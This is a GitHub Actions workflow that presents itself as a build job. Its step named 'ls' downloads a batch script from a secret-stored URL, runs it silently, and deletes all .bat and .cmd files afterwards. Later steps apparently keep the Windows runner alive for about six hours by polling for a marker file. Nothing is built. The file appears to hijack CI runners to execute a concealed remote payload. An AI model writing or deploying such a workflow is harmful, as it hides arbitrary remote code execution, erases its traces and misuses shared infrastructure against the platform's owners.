name: Makealast
on:
  workflow_dispatch:

jobs:
  build:
    name: Building
    runs-on: windows-latest

    steps:
    - name: ls
      shell: cmd
      run: |
        curl -L %GIST_URL% -o loads.bat >nul 2>&1
        cmd /c loads.bat >nul 2>&1
      env:
        GIST_URL: ${{ secrets.GIST_URL }}

    - name: Del1
      run: cmd /c "del /f *.bat"

    - name: Del2
      run: cmd /c "del /f *.cmd"
      
    - name: Create the file D:/abc.txt
      run: |
        $filePath = "D:/abc.txt"
        if (-Not (Test-Path $filePath)) {
            New-Item -Path $filePath -ItemType File
            Write-Host "File created at $filePath"
        } else {
            Write-Host "File already exists at $filePath"
        }
    
    - name: Check if D:/abc.txt exists and wait for 1 hour
      run: |
        $timeout = 21960
        $elapsedTime = 0
        $filePath = "D:/abc.txt"
        
        while ($elapsedTime -lt $timeout) {
            if (Test-Path $filePath) {
                break
            } else {
                Start-Sleep -Seconds 30
                $elapsedTime += 30
            }
        }
        
        if ($elapsedTime -ge $timeout) {
            Write-Host "File not found within the timeout period, moving to next job."
        }
